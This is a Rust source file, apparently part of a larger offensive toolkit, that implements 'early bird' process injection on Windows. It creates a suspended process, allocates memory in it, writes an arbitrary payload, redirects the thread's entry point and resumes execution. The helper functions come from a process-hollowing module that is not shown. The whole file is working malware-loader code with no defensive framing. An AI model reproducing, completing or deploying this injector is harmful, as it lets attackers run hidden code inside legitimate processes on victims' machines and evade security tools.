// Early Bird Injection
// Injects payload before main thread starts

use winapi::um::winnt::*;
use winapi::um::processthreadsapi::*;
use winapi::um::memoryapi::*;
use winapi::um::errhandlingapi::*;
use winapi::shared::minwindef::*;
use std::ptr;
use std::ffi::CString;
use crate::process_hollowing::create_suspended_process;

/// Early bird injection - inject before main thread starts
pub unsafe fn early_bird_injection(
    target_path: &str,
    payload_data: &[u8],
    entry_point_rva: usize,
) -> Result<(), String> {
    // Step 1: Create suspended process
    let hollowed = create_suspended_process(target_path)?;
    
    // Step 2: Get process image base from PEB
    use crate::process_hollowing::get_process_image_base;
    let image_base = get_process_image_base(hollowed.thread_handle)?;
    
    // Step 3: Allocate memory in target process
    use crate::process_hollowing::allocate_memory_in_process;
    let allocated_base = allocate_memory_in_process(
        hollowed.process_handle,
        image_base,
        payload_data.len(),
    )?;
    
    // Step 4: Write payload to target process
    use crate::process_hollowing::write_payload_to_process;
    write_payload_to_process(hollowed.process_handle, allocated_base, payload_data)?;
    
    // Step 5: Calculate entry point
    let entry_point = (allocated_base as usize + entry_point_rva) as *mut winapi::ctypes::c_void;
    
    // Step 6: Modify entry point in thread context BEFORE resuming
    use crate::process_hollowing::update_thread_context;
    update_thread_context(hollowed.thread_handle, entry_point)?;
    
    // Step 7: Resume thread (payload will execute before main thread)
    use crate::process_hollowing::resume_thread;
    resume_thread(hollowed.thread_handle)?;
    
    Ok(())
}
